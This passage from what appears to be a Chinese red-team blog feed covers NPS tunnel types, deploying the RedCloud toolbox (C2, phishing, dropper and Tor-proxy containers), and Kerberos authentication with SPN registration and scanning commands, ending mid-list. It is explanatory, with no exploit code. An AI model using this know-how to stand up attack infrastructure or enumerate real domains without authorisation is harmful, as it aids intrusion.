src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/Untitled%205.png"></p><p>根据需求选择隧道类型：</p><ul><li>TCP隧道</li><li>HTTP代理</li><li>UDP隧道</li><li>Socks5代理</li><li>私密代理</li><li>P2P连接</li></ul><p>其他参数根据需求，例如代理访问的目标</p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>对于NPS在实战中的使用就写到这里，更多的技巧有待各位师傅去摸索。</p><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><p><a href="https://ehang-io.github.io/nps/#/">Document</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NPS快速使用技巧&quot;&gt;&lt;a href=&quot;#NPS快速使用技巧&quot; class=&quot;headerlink&quot; title=&quot;NPS快速使用技巧&quot;&gt;&lt;/a&gt;NPS快速使用技巧&lt;/h1&gt;&lt;h2 id=&quot;0x01-NPS搭建&quot;&gt;&lt;a href=&quot;#0x01-NPS搭建&quot; cla</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Redteam" scheme="http://example.com/tags/Redteam/"/>
    
  </entry>
  
  <entry>
    <title>红队基础设施搭建-RedCloud</title>
    <link href="http://example.com/2020/08/16/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA-RedCloud/"/>
    <id>http://example.com/2020/08/16/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E6%90%AD%E5%BB%BA-RedCloud/</id>
    <published>2020-08-16T08:30:47.000Z</published>
    <updated>2021-09-28T09:44:12.501Z</updated>
    
    <content type="html"><![CDATA[<p>##0x01 引子</p><blockquote><p>在红队行动中，为了匿名和便携性，经常会重复性的建设基础设施，如C2、钓鱼、代理平台等等，这样会浪费大量的精力和时间，如何去快速部署迁移这些基础设施呢？最近看到一个挺不错的项目，非常适合红队快速部署设施。</p></blockquote><h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><blockquote><p>RedCloud是一款强大的工具箱，使用Docker快速部署红队设施，能够在几分钟内快速部署如Kali、Metasploit、Gofish等基础设施，并且通过Web界面管理容器。</p></blockquote><p><a href="https://github.com/khast3x/Redcloud">RedCloud-Github传送门</a></p><p>RedCloud文件架构：</p><ul><li><code>RedCloud.py</code>:使用Docker和Portainer启动/停止Web界面和应用模板</li><li><code>Portainer</code>:Portainer Web界面</li><li><code>traefik</code>:Traefik反向代理容器到Web界面，api和文件容器</li><li><code>templates</code> :http.server提供基础设施的python3 容器</li><li><code>cert_gen</code>：生成SSL证书的<a href="https://github.com/paulczar/omgwtfssl">omgwtfssl</a>容器。</li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/uaUYJa.png" alt="uaUYJa"></p><p>相关URL：</p><ul><li><a href="https://your-server-ip/portainer">https:/your-server-ip /</a> portainer : RedCloud web界面</li><li><a href="https://your-server-ip/files">https:// your-server-ip / files</a>:Redcloud <code>redcloud_files</code>文件卷。默认密码：admin/Redcloud</li><li><a href="https://your-server-ip/api">https// your-server-ip / api</a>：Traefik反向代理运行状况监视页面。显示有关路由，后端，返回码的实时统计信息。</li></ul><h2 id="0x03-环境信息"><a href="#0x03-环境信息" class="headerlink" title="0x03 环境信息"></a>0x03 环境信息</h2><p>Centos 7</p><p>1核1G（穷🐶买不起服务器）</p><p>此配置仅为测试，实战还是需要较高配置来搭建RedCloud。</p><h2 id="0x04安装部署"><a href="#0x04安装部署" class="headerlink" title="0x04安装部署"></a>0x04安装部署</h2><ol><li>下载拉取RedCloud存储库</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/khast3x/Redcloud.git</span><br></pre></td></tr></table></figure><ol start="2"><li>启动    <code>redcloud.py</code></li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/tu1Ea3.png" alt="tu1Ea3"></p><p>相关选项如下：</p><ul><li>在本地机器部署<code>RedCloud</code></li><li>通过SSH远程部署<code>RedCloud</code></li><li>远程部署Docker RedCloud</li><li>停止本地应用或者docker机器</li><li>停止远程部署</li><li>列出所有可用的模板</li></ul><hr><p>所有模板</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&gt;] Metasploit - Nightly : Official bare Metasploit Alpine build. Includes beta features from dev branch.</span><br><span class="line"></span><br><span class="line">[&gt;] Metasploit - Stable + Postgresql : Debian Metasploit build with Postgres and additional helper scripts</span><br><span class="line"></span><br><span class="line">[&gt;] Empire : Pure Python &amp; PowerShell post-exploitation</span><br><span class="line"></span><br><span class="line">[&gt;] Sn1per : Automated pentest framework for offensive security experts</span><br><span class="line"></span><br><span class="line">[&gt;] Metasploithelper : MetasploitHelper is meant to assist penetration testers in network penetration tests. Comes with everything installed</span><br><span class="line"></span><br><span class="line">[&gt;] Pentest-tools : Ubuntu build with: searchsploit, sqlmap, nmap, nikto, dnsutils, sn1per, knock, sqliv, pasko, uniscan, wpscan, ncrack, wfuzz, sublist3r, massdns</span><br><span class="line"></span><br><span class="line">[&gt;] Kali - Bare : Official Kali container. Install desired metapackages</span><br><span class="line"></span><br><span class="line">[&gt;] Kali - Full : Non-Official Kali container with kali-linux-full metapackage installed, built every night</span><br><span class="line"></span><br><span class="line">[&gt;] Tor Socks Proxy : The smallest (15 MB) docker image with Tor and Privoxy on Alpine Linux</span><br><span class="line"></span><br><span class="line">[&gt;] Multi Tor Socks Proxy : A multi TOR (x10) + privoxy socks proxy instances load-balancer </span><br><span class="line"></span><br><span class="line">[&gt;] GoPhish : Open-Source Phishing Toolkit</span><br><span class="line"></span><br><span class="line">[&gt;] gscript : Framework to rapidly implement custom droppers for all three major operating systems</span><br><span class="line"></span><br><span class="line">[&gt;] Spiderfoot : SpiderFoot automates OSINT to find out everything possible about your target.</span><br><span class="line"></span><br><span class="line">[&gt;] ZAP Proxy WebSwing : Official in-browser version of ZAP.</span><br><span class="line"></span><br><span class="line">[&gt;] Ubuntu Web VNC : Docker container images with VNC and http NoVNC</span><br><span class="line"></span><br><span class="line">[&gt;] Kali Web noVNC + LXDE : Kali Docker container with minimal LXDE</span><br><span class="line"></span><br><span class="line">[&gt;] Lockdoor Framework : Lockdoor Framework : A Penetration Testing framework with Cyber Security Resources</span><br><span class="line"></span><br><span class="line">[&gt;] DVWA : Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is damn vulnerable</span><br><span class="line"></span><br><span class="line">[&gt;] JuiceShop : OWASP Juice Shop is an intentionally insecure web application written entirely in JavaScript which encompasses the entire range of OWASP Top Ten and other severe security flaws.</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable Wordpress : Vulnerable WordPress Installation</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable Shellshock : Vulnerable Shellshock Installation - CVE-2014-6271</span><br><span class="line"></span><br><span class="line">[&gt;] Vulnerable SambaCry : Vulnerable Samba Installation - CVE-2017-7494</span><br><span class="line"></span><br><span class="line">[&gt;] OWASP Mutillidae II : Docker container for OWASP Mutillidae II Web Pen-Test Practice Application</span><br><span class="line"></span><br><span class="line">[&gt;] Network Utilities : A lightweight docker container with a set of networking tools&lt;br&gt;Use /bin/sh</span><br><span class="line"></span><br><span class="line">[&gt;] SoftEtherVPN : A simple SoftEther VPN server</span><br><span class="line"></span><br><span class="line">[&gt;] Cowrie Honeypot : SSH Honeypot that logs authentication attempts and interactions</span><br><span class="line"></span><br><span class="line">[&gt;] Endlessh tarpit : SSH tarpit that slowly sends an endless banner</span><br><span class="line"></span><br><span class="line">[&gt;] Beagle : Incident response and digital forensics tool which transforms data sources and logs into graphs. Supported data sources include FireEye HX Triages, Windows EVTX files, SysMon logs and Raw Windows memory images.</span><br><span class="line"></span><br><span class="line">[&gt;] Nginx : High performance web server</span><br><span class="line"></span><br><span class="line">[&gt;] Httpd : Open-source HTTP server</span><br><span class="line"></span><br><span class="line">[&gt;] Caddy : HTTP/2 web server with automatic HTTPS</span><br><span class="line"></span><br><span class="line">[&gt;] MySQL : The most popular open-source database</span><br><span class="line"></span><br><span class="line">[&gt;] PostgreSQL : The most advanced open-source database</span><br><span class="line"></span><br><span class="line">[&gt;] Elasticsearch : Open-source search and analytics engine</span><br><span class="line"></span><br><span class="line">[&gt;] Gitlab CE : Open-source end-to-end software development platform</span><br><span class="line"></span><br><span class="line">[&gt;] Minio : A distributed object storage server built for cloud applications and devops</span><br><span class="line"></span><br><span class="line">[&gt;] Solr : Open-source enterprise search platform</span><br><span class="line"></span><br><span class="line">[&gt;] Joomla : Another free and open-source CMS</span><br><span class="line"></span><br><span class="line">[&gt;] Drupal : Open-source content management framework</span><br><span class="line"></span><br><span class="line">[&gt;] Odoo : Open-source business apps</span><br><span class="line"></span><br><span class="line">[&gt;] Urbackup : Open-source network backup</span><br><span class="line"></span><br><span class="line">[&gt;] Portainer Agent : Manage all the resources in your Swarm cluster</span><br><span class="line"></span><br><span class="line">[&gt;] Wordpress : Wordpress setup with a MySQL database</span><br></pre></td></tr></table></figure><h2 id="0x05-安装成功"><a href="#0x05-安装成功" class="headerlink" title="0x05 安装成功"></a>0x05 安装成功</h2><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/1urfxo.png" alt="1urfxo"></p><p>后续只需要选择自己所需要的红队设施部署就行，启动对应的容器即可。后续还有新功能请自行摸索……鸽了咕咕咕咕</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;##0x01 引子&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在红队行动中，为了匿名和便携性，经常会重复性的建设基础设施，如C2、钓鱼、代理平台等等，这样会浪费大量的精力和时间，如何去快速部署迁移这些基础设施呢？最近看到一个挺不错的项目，非常适合红队快速部署设施。&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="RedTeam" scheme="http://example.com/categories/RedTeam/"/>
    
    
    <category term="Redteam" scheme="http://example.com/tags/Redteam/"/>
    
  </entry>
  
  <entry>
    <title>Kerberos学习记录</title>
    <link href="http://example.com/2020/06/25/Kerberos%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2020/06/25/Kerberos%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-06-25T02:20:50.000Z</published>
    <updated>2021-09-28T09:31:55.566Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>最近在学习域渗透，整理了一下大佬的内容，巩固一下Kerberos基础。</p></blockquote><h1 id="Kerberos-简介"><a href="#Kerberos-简介" class="headerlink" title="Kerberos 简介"></a>Kerberos 简介</h1><blockquote><p> Kerberos 是一种由 MIT（麻省理工大学）提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p></blockquote><h2 id="Kerberos协议框架"><a href="#Kerberos协议框架" class="headerlink" title="Kerberos协议框架"></a>Kerberos协议框架</h2><p>Kerberos协议三个主要角色：</p><ol><li>访问服务的Client</li><li>提供服务的Sever</li><li>KDC（Key Distribution Center） 密钥分发中心<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/obnL22.png" alt="obnL22"><br>由上图中可以看到 KDC 又分为两个部分：</li></ol><blockquote><p> 如果把 Kerberos 中的票据类比为一张火车票，那么 Client 端就是乘客，Server 端就是火车，而 KDC 就是就是车站的认证系统。如果 Client 端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问 Server 端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是 Kerberos 中有存在两张票，而火车票从头到尾只有一张。<br> Authentication Server：AS 的作用就是验证 Client 端的身份（确定你是身份证上的本人），验证通过就会给一张 TGT（Ticket Granting Ticket）票给 Client。</p></blockquote><p>Ticket Granting Server：TGS 的作用是通过 AS 发送给 Client 的票（TGT）换取访问 Server 端的票（上车的票 ST）。ST（ServiceTicket）也有资料称为 TGS Ticket，为了和 TGS 区分，在这里就用 ST 来说明。<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/fNwH4b.png" alt="fNwH4b"></p><blockquote><p>KDC 服务框架中包含一个 KRBTGT 账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/AELrs4.png" alt="AELrs4"></p></blockquote><p>这里也有一个很好的故事</p><blockquote><p>某公司遭到竞争对手的渗透，大量公司员工账号被盗，公司领导瑟瑟发抖，因为现在不知道聊天窗对面是自己的员工还是竞争对手，在这种情况下怎么来保证员工和老板间的对话是安全并且互相可信的呢？</p></blockquote><pre><code>这时候就引入了一个第三者，HR，由于公司施行工资保密制度，员工之间不知道彼此工资的具体数字，但是HR知道全公司员工的工资数字，现在假定每个员工的工资都是不同的，我们用员工，老板，和HR来完成一个安全可信的加密机制，(假定HR是可信任的)员工，老板和HR便是Kerberos认证中的三个角色。那么继续说，公司目前处在这样一个人与人之间毫无信任可言的情况下，还是要继续运转某天，员工张二狗需要从老板大黄那里取得一份公司机密信息，但是如果二狗直接给老板发消息索要信息，那老板肯定不会给他，因为公司聊天工具里的人现在都是不可信任的，二狗不知道网线那边是不是真的老板，老板也不知道给自己发消息的是不是真的二狗，这时候就尴尬了然后这时，聪明的老王出现了，老王是个国外读了10年本科的密码学砖家，他就给公司提出来一套流程，鉴于目前大家都没有办法确定某个人就是某个人，那么我们来用密码学的手段确定彼此的身份吧这个流程是什么呢，如果二狗想给老板发消息，就要先通过HR来确定二狗就是二狗，怎么确定呢，二狗知道自己的工资，HR也知道二狗的工资，那么二狗就先给HR发个消息，我要找老板谈话，帮我弄个身份鉴定证书吧，但是二狗不能直接找HR要这个鉴定证书，因为二狗要先证明二狗就是二狗本人于是二狗先给HR发了个消息，我是二狗，我要证明我就是二狗！HR收到了二狗的消息，然后从公司数据库中一查，果然有二狗这个人，但是即使有这个人，又怎么确定二狗就是二狗本人呢，HR就用二狗的工资作为加密密钥，对一串非常复杂的数字(12345)进行加密作为消息A，然后又把这个数字12345和当前跟二狗聊天窗口的截图还有聊天的时间记到一个文件中，再用自己的工资对这个文件进行加密作为消息B之后HR把用二狗工资加密的消息A和用自己工资加密的消息B一起发送给二狗，为什么要这样做呢，二狗如果能成功解密消息A，就能得到12345，因为只有真正的二狗知道自己的工资，假二狗不知道，消息B又是用来做什么的呢，我们继续看</code></pre><p>二狗发送完消息之后，盯着聊天窗，然后钉，钉，响了两声，HR发来了两串东西，二狗看不懂，但是二狗想起来之前老王提出来的认证流程，先用自己的工资解密了第一个消息，得到了那串数字12345，然后用这串12345把跟HR聊天窗口的截图和时间放在一起进行了加密，作为消息D，那么消息C是什么呢，消息C就是HR发来的第二个消息，消息B，不过这次消息C中还要多一个东西，就是老板的名字大黄，大黄和消息B合在一起就组成了消息C</p><pre><code>为什么呢，因为二狗这次发送的消息C和D就是为了证明他就是二狗本人，二狗自然确定自己就是真二狗，那么自然也要把老板的名字加到消息中，因为他要HR给他用来跟老板对话的身份鉴定证书，如果不加上老板的名字，HR即便确定了二狗是二狗，也不知道二狗要跟谁对话现在消息C(消息B和老板的名字大黄)和消息D(二狗用12345加密的聊天窗口截图和聊天时间)就发到了HR那里</code></pre><p>HR收到了消息C和D，得到了三个东西，原来用自己工资加密的消息B，老板的名字，和之前自己随便想出来的12345加密的消息D</p><pre><code>这里就来到了第一个关键点，HR怎么通过这几个东西来确定二狗就是二狗呢，HR首先用自己的工资解密了消息C，得到了之前的聊天窗截图和聊天时间，还有自己之前随便想出来的12345，然后用这个12345来解密消息D，又得到了二狗对他们两个的聊天窗的截图和聊天时间，通过对比这两个聊天窗截图和时间是否都匹配，HR就确定了这个二狗是真的二狗(假二狗不知道真二狗的工资，所以就无法解密得到12345，也就没法用12345加密消息D，HR自然也没办法解密了)，并且就是之前跟自己聊天的那个二狗(因为之前发过去的用自己工资加密的消息B原封不动的发回来了，而这个消息B除了自己谁都无法解密修改)这里有人要问了，那HR直接用自己想出来的12345解密消息D不是也可以确定二狗就是真二狗吗，这个怎么解释呢，这个公司有一百万个员工，每个员工时不时都想跟老板说说话，而HR脑子存储量不够大，记不住12345这么复杂的数字，更何况是一百万个12345，那脑子不得爆炸了，所以把12345用自己的密钥加密发过去，再收回来用自己的密钥解密取出来，这样就不用记了现在HR确定了二狗就是二狗，那么看看二狗想跟谁聊天吧，消息C中写的是老板大黄的名字，HR就从公司数据库中查，老板大黄：工资4块3毛1角然后HR又用老板的工资，加密了和二狗聊天窗口的截图，聊天时间和另一串非常复杂的数字45678 作为消息E(也就是鉴定证书)，和用从消息C中找到12345加密了新的复杂数字45678作为消息F又回到二狗这里，二狗收到这两个消息，用12345解密了第二个消息F，得到了45678，然后用45678加密了自己和HR的聊天窗截图和聊天时间作为消息G，之后把消息E和消息G发给老板，是不是和之前很像这时老板收到了二狗的消息，老板先用自己的工资解密了消息E(HR用老板工资加密的截图，聊天时间还有45678)，得到了45678，然后用这串复杂的数字成功解密了消息G，得到二狗的截图和聊天时间，再对比这两个聊天截图和聊天时间是不是一样的，一样的话老板才能确定二狗是真二狗，经过HR权威认定的二狗，可以充满信任的聊天了，这里其实也有对老板身份的鉴别，因为假老板不会知道真老板的工资，自然也就没有办法解密消息E至此整个认证流程基本结束，我们将其中的几个关键信息提取出来，换成正常含义下对应的词语</code></pre><ul><li>二狗 Client</li><li>HR KDC</li><li>老板大黄 Service/Server</li><li>二狗的工资 Client NTLM Hash</li><li>HR的工资 krbtgt NTLM Hash</li><li>老板的工资 Service/Server NTLM Hash</li><li>HR工资加密的截图，时间和12345 TGT 黄金票据</li><li>老板工资加密的截图，时间和45678 TGS 白银票据</li><li>12345 Client/TGS Sessionkey</li><li>45678 Client/Service Sessionkey</li><li>聊天窗截图 Client ID</li><li>聊天时间 Timestamp 时间戳</li></ul><blockquote><p> 原文来自：<a href="https://ares-x.com/2020/03/12/%E6%88%8F%E8%AF%B4%E5%9C%B0%E7%8B%B1%E4%B8%89%E5%A4%B4%E7%8A%AC/">https://ares-x.com/2020/03/12/戏说地狱三头犬/</a> 3</p></blockquote><h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>当 Client 想要访问 Server 上的某个服务时，需要先向 AS 证明自己的身份，然后通过 AS 发放的 TGT 向 Server 发起认证请求，这个过程分为三块：</p><ol><li>The Authentication Service Exchange：Client 与 AS 的交互；</li><li>The Ticket-Granting Service (TGS) Exchange：Client 与 TGS 的交互；</li><li>The Client/Server Authentication Exchange：Client 与 Server 的交互。</li></ol><p><strong>The Authentication Service Exchange</strong></p><p>Client-&gt;AS:也就是Client向AS发送认证的内容<br>Client先向KDC的认证服务器AS发送Authentor1，其中内容通过Client密码的Hash加密的时间戳、ClientID、网络地址、加密类型等其他内容</p><p>AS-&gt;Client ：AS回复Client的认证内容<br>AS发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/D2c3gE.png" alt="D2c3gE"></p><blockquote><p> 在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p></blockquote><p><strong>TheTicket-Granting Service (TGS) Exchange</strong><br>    Client -&gt;TGS 请求发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p><pre><code>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</code></pre><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/wZvqjl.png" alt="wZvqjl"></p><p><strong>TheClient/Server Authentication Exchange</strong></p><p>KRB_AP_REQ<br>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)<br>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p><p>KRB_AP_REP<br>Server-&gt; Client<br>server 通过自己的密码解密 ST，得到 sessionkey-tgs, 再用 sessionkey-tgs 解密 Authenticator3 得到 TimeStamp，验证正确返回验证成功。<br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/9Z88KB.png" alt="9Z88KB"></p><h1 id="Kerberos协议中的SPN"><a href="#Kerberos协议中的SPN" class="headerlink" title="Kerberos协议中的SPN"></a>Kerberos协议中的SPN</h1><h2 id="关于SPN"><a href="#关于SPN" class="headerlink" title="关于SPN"></a>关于SPN</h2><blockquote><p> 服务主体名称（SPN）是Kerberos客户端用于唯一标识给特定Kerberos目标计算机的服务实例名称。</p></blockquote><p>服务主体名称是服务实例（有点类似服务，例如HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与服务登录帐户相关联。因此SPN扫描可以通过域控执行服务发现。</p><h2 id="SPN基础配置"><a href="#SPN基础配置" class="headerlink" title="SPN基础配置"></a>SPN基础配置</h2><blockquote><p> 详细可以查看微软官方手册<br> <a href="https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn">https://docs.microsoft.com/zh-cn/windows-server/networking/sdn/security/kerberos-with-spn</a></p></blockquote><p><strong>SPN格式</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;serviceclass&gt;/&lt;host&gt;:&lt;port&gt;/&lt;service name&gt;</span><br><span class="line"></span><br><span class="line">&lt;service class&gt;：标识服务类的字符串</span><br><span class="line"></span><br><span class="line">&lt;host&gt;：服务所在主机名称</span><br><span class="line"></span><br><span class="line">&lt;port&gt;：服务端口</span><br><span class="line"></span><br><span class="line">&lt;service name&gt;：服务名称</span><br></pre></td></tr></table></figure><p><strong>SPN注册</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Setspn -S http/&lt;computername&gt;.&lt;domainname&gt; &lt;domain-user-account&gt;</span><br><span class="line"></span><br><span class="line">-S 参数：验证不存在重复项后，添加随意 SPN。注意： -S 从 Windows Server 2008 开始系统默认提供。</span><br><span class="line">如：</span><br><span class="line">Setspn-A HTTP/test.test.com:80 test</span><br><span class="line">主机test的HTTP服务注册到SPN</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询已经注册的SPN</span><br><span class="line">setspn -q */*</span><br><span class="line">查询指定域的SPN</span><br><span class="line">setspn -T test.com -q */*</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/O9CviZ.png" alt="O9CviZ"><br><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/9WgVG6.png" alt="9WgVG6"></p><blockquote><p> 一般情况下基于主机的服务会省略后面两个组件，格式为<service class>/<host>,如：<br> <code>HTTP/test.test.com</code><br> 特别针对如果服务使用非默认端口需要加上特定端口和服务名</p></blockquote><h2 id="SPN利用"><a href="#SPN利用" class="headerlink" title="SPN利用"></a>SPN利用</h2><p><strong>SPN扫描</strong><br>在查询SPN的时候，会向域控制器发起LDAP查询，这是正常Kerberos票据行为的一部分，所以这个操作很难被检测出来。换句话说我们的SPN扫描和SPN查询，实际上就是查询LDAP中存储的内容，在域控中默认安装有ADSI编辑器，它是LDAP的编辑器，可以通过域控中运行<code>adsiedit.msc</code>打开。<br><strong>常见的SPN实例</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AcronisAgent：针对Acronis备份和数据恢复软件</span><br><span class="line">AdtServer：带有ACS的Microsoft System Center Operations Manager（2007/2012）管理服务器</span><br><span class="line">afpserver：Apple归档协议</span><br><span class="line">AgpmServer：Microsoft高级组策略管理（AGPM）</span><br><span class="line">aradminsvc - 任务主角色服务器</span><br><span class="line">arssvc - 任务主角色服务器</span><br><span class="line">bocms：商业化CMS</span><br><span class="line">BOSSO：商业对象</span><br><span class="line">CESREMOTE：与VMWare上的Citrix VDI解决方案有关，许多VDI工作站都有这个SPN。</span><br><span class="line">cifs：通用Internet文件系统</span><br><span class="line">CmRcService：Microsoft系统中心配置管理器（SCCM）远程控制</span><br><span class="line">CUSESSIONKEYSVR：CiscoUnity VOIP系统</span><br><span class="line">cvs：CVS库</span><br><span class="line">Dfsr *：分布式文件系统</span><br><span class="line">DNS：域名服务器</span><br><span class="line">E3514235-4B06-11D1-AB04-00C04FC2DCD2：NTDS DC RPC复制</span><br><span class="line">E3514235-4B06-11D1-AB04-00C04FC2DCD2-ADAM：ADAM实例</span><br><span class="line">EDVR：ExacqVision服务</span><br><span class="line">exchangeAB：Exchange通讯簿服务（通常是支持NSPI的域控制器，也通常是所有的GC）</span><br><span class="line">exchangeMDB：RPC客户端访问服务器角色</span><br><span class="line">exchangeRFR：交换通讯簿服务</span><br><span class="line">fcsvr：Apple FinalCut Server</span><br><span class="line">FileRepService：WSFileRepService.exe</span><br><span class="line">FIMService：MicrosoftForefront标识管理器（FIM）</span><br><span class="line">ftp：文件传输协议</span><br><span class="line">GC：域控制器全局编录服务</span><br><span class="line">HDFS：Hadoop（Ambari）</span><br><span class="line">host：主机服务代表主机。HOSTSPN用于在创建服务票据时访问由Kerberos协议使用长期密钥的主机帐户。</span><br><span class="line">http：支持Kerberos身份验证的http网络服务的SPN</span><br><span class="line">Hyper-V副本服务：MicrosoftHyper-V的副本服务</span><br><span class="line">IMAP：Internet消息访问协议</span><br><span class="line">IMAP4：Internet消息访问协议版本4</span><br><span class="line">ipp：Internet打印协议</span><br><span class="line">iSCSITarget：iSCSI 配置</span><br><span class="line">kadmin：Kerberos</span><br><span class="line">ldap：LDAP服务，如域控制器或ADAM实例。</span><br><span class="line">Magfs：MaginaticsMagFS</span><br><span class="line">mapred：Cloudera</span><br><span class="line">Microsoft虚拟控制台服务：HyperV主机</span><br><span class="line">Microsoft虚拟系统迁移服务：P2V支持（Hyper-V）</span><br><span class="line">mongod：MongoDBEnterprise</span><br><span class="line">mongos：MongoDBEnterprise</span><br><span class="line">MSClusterVirtualServer：Windows群集服务器</span><br><span class="line">MSOLAPSvc：SQLServer分析服务</span><br><span class="line">MSOLAPSvc.3：SQLServer分析服务</span><br><span class="line">MSOLAPDisco.3：SQLServer分析服务</span><br><span class="line">MSOMHSvc：Microsoft系统中心运营经理（2007/2012）管理服务器</span><br><span class="line">MSOMSdkSvc：MicrosoftSystem Center Operations Manager（2007/2012）管理服务器</span><br><span class="line">MSServerCluster：Windows群集服务器</span><br><span class="line">MSServerClusterMgmtAPI：此群集API需要此SPN才能通过使用Kerberos向服务器进行身份验证</span><br><span class="line">MSSQL：Microsoft SQLServer</span><br><span class="line">MSSQLSvc：MicrosoftSQL Server</span><br><span class="line">MSSQL $ ADOBECONNECT：支持Adobe Connect的Microsoft SQL Server</span><br><span class="line">MSSQL $ BIZTALK：MicrosoftSQL Server支持Microsoft Biztalk服务器</span><br><span class="line">MSSQL $ BUSINESSOBJECTS：支持Business Objects的Microsoft SQL Server</span><br><span class="line">MSSQL $ DB01NETIQ：支持NetIQ的Microsoft SQL Server</span><br><span class="line">nfs：网络文件系统</span><br><span class="line">NPPolicyEvaluator：戴尔Quest审计员</span><br><span class="line">NPRepository 4（CHANGEAUDITOR）：戴尔Quest Change Auditor</span><br><span class="line">NPRepository4（CAAD）：戴尔Quest审核员</span><br><span class="line">NPRepository4（默认）：戴尔任务审计员</span><br><span class="line">NtFrs *：NT文件复制服务</span><br><span class="line">oracle：OracleKerberos身份验证</span><br><span class="line">pcast：苹果播客制作人</span><br><span class="line">PCNSCLNT：自动密码同步解决方案（MIIS 2003＆FIM）</span><br><span class="line">POP：邮箱协议</span><br><span class="line">POP3：邮箱协议版本3</span><br><span class="line">PVSSoap：Citrix ProvisioningServices（7.1）</span><br><span class="line">RestrictedKrbHost：使用服务类字符串等于“RestrictedKrbHost”的 SPN的服务类，其服务凭单使用计算机帐户密钥并共享会话密钥。</span><br><span class="line">RPC：远程过程调用服务</span><br><span class="line">SAP：SAP /SAPService</span><br><span class="line">SAS：SAS服务器</span><br><span class="line">SCVMM：System Center虚拟机管理器</span><br><span class="line">secshd：IBMInfoSphere</span><br><span class="line">sip：会话启动协议</span><br><span class="line">SMTP：简单邮件传输协议</span><br><span class="line">SMTPSVC：简单邮件传输协议</span><br><span class="line">SoftGrid： Microsoft应用程序虚拟化（App-V）以前的“SoftGrid”</span><br><span class="line">STS：VMWare SSO服务</span><br><span class="line">SQLAgent $ DB01NETIQ：NetIQ的SQL服务</span><br><span class="line">tapinego：与路由应用程序相关联，例如Microsoft防火墙（ISA，TMG等）</span><br><span class="line">TERMSRV：Microsoft远程桌面协议服务，又名终端服务。</span><br><span class="line">tnetd：JuniperKerberos身份验证 “Tnetd是一个守护进程，用于路由引擎和数据包转发引擎等不同组件之间的内部通信”</span><br><span 